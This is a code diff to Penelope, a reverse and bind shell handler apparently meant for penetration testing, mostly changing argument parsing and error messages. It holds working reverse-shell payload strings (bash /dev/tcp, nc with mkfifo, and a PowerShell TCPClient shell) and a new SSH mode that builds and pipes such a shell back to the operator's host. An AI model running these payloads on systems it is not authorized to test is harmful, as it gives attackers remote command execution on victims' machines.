@@ -51,7 +51,7 @@ from zlib import compress
 from errno import EADDRINUSE, EADDRNOTAVAIL
 from select import select
 from pathlib import Path, PureWindowsPath
-from argparse import ArgumentParser
+from argparse import ArgumentParser, ArgumentDefaultsHelpFormatter
 from datetime import datetime
 from textwrap import indent, dedent
 from binascii import Error as binascii_error
@@ -1734,12 +1734,13 @@ class Core:
 def handle_bind_errors(func):
 	@wraps(func)
 	def wrapper(*args, **kwargs):
+		host = args[1]
+		port = args[2]
 		try:
 			func(*args, **kwargs)
 			return True
 
 		except PermissionError:
-			port = args[2]
 			logger.error(f"Cannot bind to port {port}: Insufficient privileges")
 			print(dedent(
 			f"""
@@ -1768,9 +1769,9 @@ def handle_bind_errors(func):
 
 		except OSError as e:
 			if e.errno == EADDRINUSE:
-				logger.error("The port is currently in use")
+				logger.error(f"The port '{port}' is currently in use")
 			elif e.errno == EADDRNOTAVAIL:
-				logger.error("Cannot listen on the requested address")
+				logger.error(f"Cannot listen on '{host}'")
 			else:
 				logger.error(f"OSError: {str(e)}")
 
@@ -1888,7 +1889,7 @@ class TCPListener:
 		interfaces = Interfaces().list
 		presets = [
 			"(bash >& /dev/tcp/{}/{} 0>&1) &",
-			"(rm /tmp/_;mkfifo /tmp/_;cat /tmp/_|sh 2>&1|nc {} {} >/tmp/_) &",
+			"(rm /tmp/_;mkfifo /tmp/_;cat /tmp/_|sh 2>&1|nc {} {} >/tmp/_) >/dev/null 2>&1 &",
 			'$client = New-Object System.Net.Sockets.TCPClient("{}",{});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()' # Taken from revshells.com
 		]
 
@@ -4844,8 +4845,9 @@ class Options:
 	def __init__(self):
 		self.basedir = Path.home() / f'.{__program__}'
 		self.default_listener_port = 4444
-		self.default_interface = "0.0.0.0"
+		self.default_bindshell_port = 5555
 		self.default_fileserver_port = 8000
+		self.default_interface = "0.0.0.0"
 		self.payloads = False
 		self.no_log = False
 		self.no_timestamps = False
@@ -4936,9 +4938,12 @@ class Options:
 def main():
 
 	## Command line options
-	parser = ArgumentParser(description="Penelope Shell Handler", add_help=False)
+	parser = ArgumentParser(description="Penelope Shell Handler", add_help=False,
+		formatter_class=lambda prog: ArgumentDefaultsHelpFormatter(prog, width=150, max_help_position=40))
 
-	parser.add_argument("ports", nargs='*', help="Ports to listen/connect to, depending on -i/-c options. Default: 4444")
+	parser.add_argument("-p", "--port", help=f"Port to listen/connect/serve, depending on -i/-c/-s options. \
+		Default: {options.default_listener_port}/{options.default_bindshell_port}/{options.default_fileserver_port}")
+	parser.add_argument("args", nargs='*', help="Arguments for -s/--serve and SSH reverse shell")
 
 	method = parser.add_argument_group("Reverse or Bind shell?")
 	method.add_argument("-i", "--interface", help="Interface or IP address to listen on. Default: 0.0.0.0", metavar='')
@@ -4963,7 +4968,6 @@ def main():
 
 	misc = parser.add_argument_group("File server")
 	misc.add_argument("-s", "--serve", help="HTTP File Server mode", action="store_true")
-	misc.add_argument("-p", "--port", help="File Server port. Default: 8000", metavar='')
 	misc.add_argument("-prefix", "--url-prefix", help="URL prefix", type=str, metavar='')
 
 	debug = parser.add_argument_group("Debug")
@@ -4989,52 +4993,60 @@ def main():
 	# Show Version
 	if options.version:
 		print(__version__)
-		sys.exit()
 
 	# Show Interfaces
 	elif options.interfaces:
 		print(Interfaces())
-		sys.exit()
 
 	# Check hardcoded URLs
 	elif options.check_urls:
 		signal.signal(signal.SIGINT, signal.SIG_DFL)
 		check_urls()
-		sys.exit()
 
 	# Main Menu
 	elif options.menu:
 		signal.signal(signal.SIGINT, keyboard_interrupt)
 		menu.show()
 		menu.start()
-		sys.exit()
 
 	# File Server
 	elif options.serve:
-		server = FileServer(*options.ports or '.', port=options.port, host=options.interface, url_prefix=options.url_prefix)
+		server = FileServer(*options.args or '.', port=options.port, host=options.interface, url_prefix=options.url_prefix)
 		if server.filemap:
 			server.start()
 		else:
 			logger.error("No files to serve")
-		sys.exit()
 
-	if not options.ports:
-		options.ports.append(options.default_listener_port)
-
-	for port in options.ports:
-		# Bind shell
-		if options.connect:
-			if not Connect(options.connect, port):
-				sys.exit(1)
-		# Reverse Listener
+	# Reverse shell via SSH
+	elif options.args and options.args[0] == "ssh":
+		if len(options.args) > 1:
+			TCPListener(host=options.interface, port=options.port)
+			options.args.append(f"HOST=$(echo $SSH_CLIENT | cut -d' ' -f1); PORT={options.port or options.default_listener_port};"
+				f"printf \"(bash >& /dev/tcp/$HOST/$PORT 0>&1) &\"|bash ||"
+				f"printf \"(rm /tmp/_;mkfifo /tmp/_;cat /tmp/_|sh 2>&1|nc $HOST $PORT >/tmp/_) >/dev/null 2>&1 &\"|sh"
+			)
+		if subprocess.run(options.args).returncode == 0:
+			logger.info("SSH command executed!")
+			menu.start()
 		else:
-			TCPListener(host=options.interface, port=port)
-			if not core.listeners:
-				sys.exit(1)
-	listener_menu()
-	signal.signal(signal.SIGINT, keyboard_interrupt)
-	menu.start()
-	sys.exit()
+			core.stop()
+			sys.exit(1)
+
+	# Bind shell
+	elif options.connect:
+		if not Connect(options.connect, options.port or options.default_bindshell_port):
+			sys.exit(1)
+		menu.start()
+
+	# Reverse Listener
+	else:
+		TCPListener(host=options.interface, port=options.port)
+		if not core.listeners:
+			sys.exit(1)
+
+		listener_menu()
+		signal.signal(signal.SIGINT, keyboard_interrupt)
+		menu.start()
 
 #################### PROGRAM LOGIC ####################
 
